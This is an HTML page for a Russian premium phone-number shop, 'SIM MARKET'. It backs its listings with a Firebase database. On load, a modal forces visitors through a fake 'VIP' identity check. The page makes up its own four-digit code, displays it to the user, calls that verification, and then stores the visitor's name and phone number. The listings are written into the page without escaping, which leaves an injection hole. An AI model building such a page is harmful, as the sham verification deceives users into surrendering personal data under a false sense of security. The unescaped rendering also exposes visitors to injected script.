<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SIM MARKET | LUXURY STOCK v2.2</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap');
        body { font-family: 'Manrope', sans-serif; background: #0a0a0a; color: #fff; margin: 0; overflow-x: hidden; }
        
        .gold-grad {
            background: linear-gradient(90deg, #bf953f, #fcf6ba, #bf953f, #fcf6ba, #bf953f);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gold-flow 4s linear infinite;
        }
        @keyframes gold-flow { to { background-position: 200% center; } }
        
        #banner-box { display: none; background: rgba(191,149,63,0.1); border-top: 1px solid #bf953f; border-bottom: 1px solid #bf953f; padding: 12px 0; overflow: hidden; margin-bottom: 25px; }
        .marquee { display: inline-block; white-space: nowrap; animation: marquee 20s linear infinite; color: #fcf6ba; font-weight: 800; font-size: 11px; text-transform: uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        .tab-btn { background: rgba(255,255,255,0.05); padding: 10px 18px; border-radius: 12px; font-size: 10px; font-weight: 800; text-transform: uppercase; color: #555; transition: 0.3s; border: 1px solid transparent; flex-shrink: 0; }
        .tab-active { background: #bf953f; color: #000; box-shadow: 0 5px 15px rgba(191,149,63,0.4); border-color: #fcf6ba; }
        .no-scrollbar::-webkit-scrollbar { display: none; }

        .neon-card { position: relative; background: rgba(191, 149, 63, 0.1); border-radius: 28px; padding: 2px; overflow: hidden; margin-bottom: 30px; }
        .neon-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, #bf953f, #fcf6ba, #bf953f, transparent); animation: rotate 4s linear infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        .card-content { position: relative; background: #0d0d0d; border-radius: 26px; padding: 30px 20px; z-index: 1; display: flex; flex-direction: column; align-items: center; }
        .price-text { font-size: 32px; font-weight: 800; color: #bf953f; margin: 15px 0; }
        .buy-btn { background: linear-gradient(135deg, #bf953f, #fcf6ba); color: #000; font-weight: 900; font-size: 11px; text-transform: uppercase; padding: 18px; border-radius: 18px; width: 100%; border: none; cursor: pointer; transition: 0.3s; }

        #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px); }
        .modal-content { position: relative; background: #0d0d0d; width: 100%; max-width: 350px; border-radius: 30px; padding: 30px; border: 1px solid #bf953f; box-shadow: 0 0 40px rgba(191,149,63,0.2); }
        .input-box { margin-bottom: 20px; }
        .input-box input { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(191,149,63,0.3); padding: 16px; border-radius: 16px; color: #fff; outline: none; font-size: 14px; transition: 0.3s; }
        .input-box input:focus { border-color: #bf953f; background: rgba(191,149,63,0.05); }
        .label { font-size: 9px; font-weight: 800; color: #bf953f; text-transform: uppercase; margin-bottom: 8px; display: block; letter-spacing: 1px; }

        .chat-trigger { background: #bf953f; width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; position: fixed; bottom: 30px; right: 25px; z-index: 1000; border: none; box-shadow: 0 10px 30px rgba(191,149,63,0.4); cursor: pointer; }
    </style>
</head>
<body class="p-5 pb-32">

    <header class="text-center py-12">
        <h1 class="text-4xl font-black italic gold-grad tracking-tighter">SIM MARKET</h1>
        <p class="text-[9px] tracking-[5px] opacity-30 uppercase mt-2 font-extrabold text-[#bf953f]">Exclusive Selection v2.2</p>
    </header>

    <div id="banner-box"><div class="marquee" id="banner-txt"></div></div>

    <div class="max-w-md mx-auto flex gap-2 overflow-x-auto no-scrollbar mb-10 pb-2">
        <button onclick="setFilter('all', this)" class="tab-btn tab-active">Все</button>
        <button onclick="setFilter('mts', this)" class="tab-btn">МТС</button>
        <button onclick="setFilter('megafon', this)" class="tab-btn">Мегафон</button>
        <button onclick="setFilter('beeline', this)" class="tab-btn">Билайн</button>
        <button onclick="setFilter('tele2', this)" class="tab-btn">Tele2</button>
    </div>

    <div id="list" class="max-w-md mx-auto"></div>

    <div id="modal">
        <div class="modal-content">
            <div id="step-1">
                <h2 class="text-2xl font-black text-center mb-1 text-white">Вход в VIP систему</h2>
                <p class="text-center text-[9px] opacity-40 uppercase mb-8 gold-grad font-bold">Подтвердите вашу личность</p>
                <div class="input-box">
                    <span class="label">Имя (для обращения)</span>
                    <input type="text" id="fio" placeholder="Курбан">
                </div>
                <div class="input-box">
                    <span class="label">Ваш номер</span>
                    <input type="tel" id="contact" placeholder="+7 (999) 000-00-00">
                </div>
                <button onclick="requestVerification()" class="buy-btn mt-4">Получить доступ</button>
            </div>

            <div id="step-2" style="display: none;">
                <h2 class="text-2xl font-black text-center mb-1 text-white italic">Код из Push</h2>
                <p class="text-center text-[9px] opacity-60 uppercase mb-8 text-green-500 font-bold">Сессия активирована</p>
                <div class="input-box">
                    <span class="label">Введите код</span>
                    <input type="text" id="ver-code" placeholder="0000" maxlength="4" class="text-center text-2xl tracking-[12px] font-black">
                </div>
                <button onclick="confirmAndSend()" class="buy-btn mt-4">Войти в Маркет</button>
                <p id="retry-timer" class="text-center mt-6 text-[10px] opacity-50 uppercase font-bold text-white"></p>
                <button id="retry-btn" onclick="requestVerification()" style="display: none;" class="w-full text-center mt-4 text-[10px] text-[#bf953f] underline uppercase font-bold">Отправить код повторно</button>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyCRjRJkH4dPxvyYD-37emejFvK11g6hZ44", 
            authDomain: "nnnmb-a0b52.firebaseapp.com", 
            databaseURL: "https://nnnmb-a0b52-default-rtdb.firebaseio.com", 
            projectId: "nnnmb-a0b52" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let allNumbers = {};
        let generatedCode = null;
        let timerInt = null;

        // ЗАПУСК ПРИ ВХОДЕ
        window.onload = () => {
            // Если пользователь еще не авторизован (в этой сессии)
            if(!sessionStorage.getItem('is_auth')) {
                setTimeout(() => {
                    document.getElementById('modal').style.display = 'flex';
                }, 1000); // Показываем окно через 1 сек после входа
            }
            if (Notification.permission !== "granted") { Notification.requestPermission(); }
        };

        db.ref('inventory').on('value', s => { allNumbers = s.val() || {}; render(); });
        
        function render() {
            const list = document.getElementById('list');
            list.innerHTML = "";
            Object.keys(allNumbers).reverse().forEach(k => {
                const item = allNumbers[k];
                list.innerHTML += `
                    <div class="neon-card">
                        <div class="card-content">
                            <div class="w-full flex justify-between items-center opacity-30 text-[9px] font-bold uppercase mb-4 px-1">
                                <span>${item.op}</span><span class="gold-grad italic">Elite Status</span>
                            </div>
                            <div class="text-4xl font-black italic tracking-tighter text-white">+7 ${item.num}</div>
                            <div class="price-text">${parseInt(item.price).toLocaleString()} ₽</div>
                            <button class="buy-btn" onclick="openOrderModal('${item.num}')">Купить номер</button>
                        </div>
                    </div>`;
            });
        }

        function requestVerification() {
            const fio = document.getElementById('fio').value.trim();
            const con = document.getElementById('contact').value.trim();
            if(!fio || !con) return alert("Введите данные!");

            generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
            
            if (Notification.permission === "granted") {
                new Notification("SIM MARKET", { body: `Ваш код доступа: ${generatedCode}` });
            } else {
                alert("Ваш код доступа: " + generatedCode);
            }

            document.getElementById('step-1').style.display = 'none';
            document.getElementById('step-2').style.display = 'block';
            startTimer();
        }

        function startTimer() {
            let sec = 30;
            const timerText = document.getElementById('retry-timer');
            const retryBtn = document.getElementById('retry-btn');
            retryBtn.style.display = 'none';
            timerText.style.display = 'block';

            if(timerInt) clearInterval(timerInt);
            timerInt = setInterval(() => {
                sec--;
                timerText.innerText = `Регенерация кода через ${sec}с`;
                if(sec <= 0) {
                    clearInterval(timerInt);
                    timerText.style.display = 'none';
                    retryBtn.style.display = 'block';
                }
            }, 1000);
        }

        function confirmAndSend() {
            const code = document.getElementById('ver-code').value.trim();
            if(code === generatedCode) {
                sessionStorage.setItem('is_auth', 'true'); // Запоминаем вход
                db.ref('visits_auth').push({ 
                    name: document.getElementById('fio').value,
                    phone: document.getElementById('contact').value,
                    ts: Date.now() 
                });
                alert("Доступ разрешен!");
                document.getElementById('modal').style.display = 'none';
            } else {
                alert("Неверный код!");
            }
        }

        function openOrderModal(num) {
            alert("Вы выбрали номер +7 " + num + ". Наш менеджер свяжется с вами, так как вы уже авторизованы.");
            db.ref('leads').push({ num: num, ts: Date.now(), status: 'pre-auth' });
        }
    </script>
</body>
</html>
